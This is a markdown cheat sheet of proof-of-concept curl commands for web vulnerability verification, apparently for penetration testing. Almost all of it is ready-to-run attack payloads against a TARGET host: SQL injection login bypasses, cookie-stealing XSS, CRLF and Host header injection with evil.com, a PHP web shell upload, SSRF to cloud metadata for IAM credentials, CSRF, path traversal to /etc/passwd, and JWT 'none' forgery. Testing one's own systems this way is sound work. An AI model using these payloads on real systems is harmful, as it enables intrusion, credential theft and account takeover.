# PoC Curl Patterns

One-liner curl commands for quick vulnerability verification. Replace `TARGET` with the host. Markers: `VULNERABLE` = exploitable, `PATCHED` = mitigated.

## GET Parameter Injection

```bash
# SQLi in query param — always-true probe
curl -s "http://TARGET/api/items?id=1%20OR%201=1" | head -c 500
# VULNERABLE: returns more results than id=1 alone
# PATCHED: error message, WAF block, or identical response to id=1

# Reflected XSS in search
curl -s "http://TARGET/search?q=%3Cscript%3Ealert(1)%3C/script%3E" | grep -o '<script>alert(1)</script>'
# VULNERABLE: script tag appears unencoded in response
# PATCHED: empty grep output (payload encoded or stripped)
```

## POST Body Injection

```bash
# SQLi in JSON body
curl -s -X POST "http://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" OR 1=1--","password":"x"}'
# VULNERABLE: authentication succeeds or returns user data
# PATCHED: login fails, returns 401

# SQLi in form-encoded body
curl -s -X POST "http://TARGET/api/login" \
  -d "username=admin'%20OR%201=1--&password=x"
# VULNERABLE: session cookie set or 200 with user data
# PATCHED: 401 or error response
```

## Header Injection

```bash
# Auth bypass — missing or forged headers
curl -s -H "X-Forwarded-For: 127.0.0.1" "http://TARGET/admin/dashboard"
# VULNERABLE: 200 with admin content (IP allowlist bypass)
# PATCHED: 401/403 regardless of header

# CRLF injection in header value
curl -s "http://TARGET/redirect?url=http://evil.com%0d%0aSet-Cookie:%20admin=true"
# VULNERABLE: response contains injected Set-Cookie header
# PATCHED: URL is sanitized, no extra headers in response

# Host header poisoning
curl -s -H "Host: evil.com" "http://TARGET/reset-password" | grep -i "evil.com"
# VULNERABLE: password reset link contains evil.com
# PATCHED: link uses configured host, not Host header
```

## Cookie Manipulation

```bash
# Privilege escalation via role cookie
curl -s -b "session=VALID_SESSION; role=admin" "http://TARGET/admin/users"
# VULNERABLE: 200 with admin data (client-side role check)
# PATCHED: 403 (role determined server-side)

# Session fixation — set known session before auth
curl -s -c - -b "session=attacker_controlled_value" \
  -X POST "http://TARGET/login" -d "user=victim&pass=password"
# VULNERABLE: post-login session cookie matches pre-login value
# PATCHED: session ID regenerated after authentication
```

## File Upload

```bash
# PHP upload with double extension bypass
curl -s -X POST "http://TARGET/upload" \
  -F "file=@-;filename=shell.php.jpg;type=image/jpeg" <<< '<?php system($_GET["cmd"]); ?>'
# VULNERABLE: file uploaded and accessible, server executes PHP
# PATCHED: rejected by extension filter or content-type validation

# SVG with embedded XSS
curl -s -X POST "http://TARGET/upload" \
  -F 'file=@-;filename=xss.svg;type=image/svg+xml' <<< '<svg><script>alert(document.cookie)</script></svg>'
# VULNERABLE: SVG served with permissive content-type, script executes
# PATCHED: SVG sanitized or served with Content-Disposition: attachment
```

## SSRF

```bash
# AWS metadata via SSRF
curl -s -X POST "http://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# VULNERABLE: response contains IAM role name or credentials
# PATCHED: 400/403, URL blocked by allowlist

# Internal service probe
curl -s -X POST "http://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/actuator/health"}'
# VULNERABLE: response contains internal service health data
# PATCHED: request rejected or times out
```

## CSRF

```html
<!-- Save as csrf.html, open in browser while authenticated to TARGET -->
<html><body>
<form id="f" action="http://TARGET/api/user/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
<!-- VULNERABLE: email changed without CSRF token validation -->
<!-- PATCHED: 403 Forbidden, missing or invalid CSRF token -->
```

## Path Traversal

```bash
# Basic traversal
curl -s "http://TARGET/api/files?name=../../../etc/passwd" | head -5
# VULNERABLE: contains root:x:0:0 or similar passwd entries
# PATCHED: 400/404 or sanitized path

# Double-encoded traversal (bypasses single decode filters)
curl -s "http://TARGET/api/files?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd" | head -5
# VULNERABLE: file contents returned despite encoding filter
# PATCHED: blocked or decoded safely before path resolution
```

## JWT Manipulation

```bash
# None algorithm attack — remove signature verification
# Header: {"alg":"none","typ":"JWT"} → base64url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub":"admin","role":"admin"} → base64url: eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." \
  "http://TARGET/api/admin/users"
# VULNERABLE: 200 with admin data (none algorithm accepted)
# PATCHED: 401 (algorithm not in allowlist)
```
